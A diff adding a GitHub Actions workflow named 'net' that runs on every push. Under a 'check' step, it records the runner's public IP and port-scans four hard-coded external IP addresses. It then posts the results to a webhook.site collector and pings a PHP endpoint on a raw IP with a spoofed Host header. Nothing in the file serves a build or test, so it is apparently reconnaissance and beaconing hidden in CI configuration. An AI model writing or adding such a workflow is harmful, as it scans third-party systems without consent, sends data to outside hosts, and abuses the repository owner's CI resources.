@@ -1,0 +1,34 @@
+name: net
+on: [push, workflow_dispatch]
+jobs:
+  net:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: check
+        run: |
+          echo "RUNNER $(curl -s -m 10 https://api.ipify.org)"
+          python3 - <<'PYEOF'
+import socket, urllib.request
+HOSTS=["103.20.215.96","103.20.213.118","103.20.214.68","103.20.214.150"]
+PORTS=[21,3306,3307,80,443,8443]
+out=[]
+for h in HOSTS:
+    for p in PORTS:
+        s=socket.socket(); s.settimeout(5)
+        try:
+            s.connect((h,p)); out.append("OPEN %s:%d"%(h,p))
+        except Exception as e:
+            out.append("closed %s:%d %s"%(h,p,type(e).__name__))
+        finally: s.close()
+body="\n".join(out).encode()
+print("\n".join(out))
+try:
+    r=urllib.request.urlopen(urllib.request.Request("https://webhook.site/48cc5f93-9625-4813-b1e0-99e457ca12d2",data=body,method="POST",headers={"Content-Type":"text/plain"}),timeout=20)
+    print("post",r.status)
+except Exception as e:
+    print("post fail",repr(e)[:200])
+PYEOF
+      - name: to66
+        if: always()
+        run: curl -s -m 20 -H "Host: administrator.com" --data-binary "ping-from-runner-$(date -u +%s)" "http://103.120.176.66/ul9x.php?n=ping" || true
